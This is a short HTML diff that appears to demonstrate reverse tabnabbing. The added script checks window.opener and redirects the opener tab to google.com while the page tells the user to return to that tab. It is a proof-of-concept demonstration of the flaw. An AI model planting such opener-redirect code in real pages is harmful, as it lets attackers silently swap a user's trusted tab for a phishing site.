@@ -1,1 +1,7 @@
-<h1>a vuln!</h1>
+<h1>imagine there is some semi-useful content here.<br>now, go back to the tab you just opened...</h1>
+<script>
+  if(window.opener == null) {
+    alert('not vulnerable, nevermind...')
+  }
+  window.opener.location ='https://google.com';
+</script>
